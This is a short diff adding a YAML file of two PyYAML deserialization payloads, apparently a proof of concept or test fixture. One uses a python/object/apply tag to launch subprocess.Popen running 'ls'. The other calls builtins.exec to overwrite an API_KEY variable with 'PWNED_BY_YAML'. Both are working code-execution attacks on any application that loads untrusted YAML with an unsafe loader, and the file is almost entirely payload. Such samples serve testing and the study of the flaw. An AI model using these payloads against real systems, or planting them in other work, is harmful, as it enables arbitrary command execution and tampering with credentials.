@@ -1,0 +1,8 @@
+# Using subprocess.Popen to execute 'ls'
+- !!python/object/apply:subprocess.Popen
+  - [ls]
+
+# Using builtins.exec to change a variable (API_KEY) 
+# Note: This assumes API_KEY is in a scope accessible to the exec call
+- !!python/object/apply:builtins.exec
+  - "global API_KEY; API_KEY = 'PWNED_BY_YAML'; print(f'New Key: {API_KEY}')"
